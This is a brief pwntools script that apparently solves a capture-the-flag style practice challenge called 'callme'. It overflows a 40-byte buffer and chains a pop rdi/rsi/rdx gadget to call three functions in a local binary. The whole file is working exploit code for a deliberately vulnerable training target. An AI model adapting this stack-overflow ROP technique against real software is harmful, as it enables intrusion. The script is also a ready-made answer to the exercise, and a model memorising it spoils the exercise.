from pwn import *

# 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret

#   4 0x00401810  GLOBAL    FUNC callme_three
#   8 0x00401850  GLOBAL    FUNC callme_one
#  11 0x00401870  GLOBAL    FUNC callme_two


junk = "A" * 40

pppr = p64(0x401ab0)

callme_one = p64(0x401850)
callme_two = p64(0x401870)
callme_three = p64(0x401810)

params = p64(1) + p64(2) + p64(3)
payload = junk + pppr + params + callme_one
payload += pppr + params + callme_two
payload += pppr + params + callme_three

p = process('./callme')
#io = gdb.attach(p)
p.recvuntil('> ')
p.sendline(payload)
p.recvall()
#p.interactive()
